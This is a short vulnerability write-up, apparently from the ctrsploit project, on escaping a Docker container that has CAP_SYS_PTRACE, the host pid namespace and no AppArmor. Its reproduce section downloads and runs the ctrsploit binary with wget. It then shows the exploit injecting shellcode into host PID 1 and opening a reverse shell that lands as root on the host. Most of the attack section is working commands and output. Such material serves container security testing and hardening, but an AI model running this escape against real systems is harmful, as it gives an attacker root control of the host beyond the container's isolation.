---
maintainer:
    - ssst0n3
---
# CAP_SYS_PTRACE escape with host pid namespace

## 1. Vulnerability Overview

A container with CAP_SYS_PTRACE and host pid namespace can be escaped by inject code into host process.

## 2. Exploit Scenario

Insecure Container Config

## 3. Prerequisite

1. CAP_SYS_PTRACE
2. host pid namespace
3. without apparmor

## 4. Vulnerability Existence Check

`ctrsploit checksec ptrace-pid-host`

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

<details><summary>env details</summary>

```shell
root@localhost:~# docker --version
Docker version 28.3.2, build 578ccf6
root@localhost:~# containerd --version
containerd containerd.io 1.7.27 05044ec0a9a75232cad458027ca83437aae3f4da
root@localhost:~# runc --version
runc version 1.2.5
commit: v1.2.5-0-g59923ef
spec: 1.2.0
go: go1.23.7
libseccomp: 2.5.5
```

</details>

### 5.2 Reproduce Steps

```shell
root@localhost:~# docker run -ti --cap-add CAP_SYS_PTRACE --pid host --security-opt apparmor=unconfined busybox:latest
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul caps ptrace x ptrace-pid-host
INFO[0000] listening on 172.17.0.2:2333                 
INFO[0000] Injecting into PID: 1                        
INFO[0000] Reverse shell will connect to 172.17.0.2:2333 
INFO[0000] Attached. Process stopped. WaitStatus: 4991  
INFO[0000] Injected shellcode at RIP (0x7ddccfd2a007)   
INFO[0000] Child process forked with PID: 889           
INFO[0000] Parent process trapped. WaitStatus: 1407     
INFO[0000] Restored original code.                      
INFO[0000] Restored original registers.                 
INFO[0000] received connection from 172.17.0.1:37770    
ls -lah /usr/bin/docker
-rwxr-xr-x 1 root root 44M Jul  9 16:13 /usr/bin/docker
```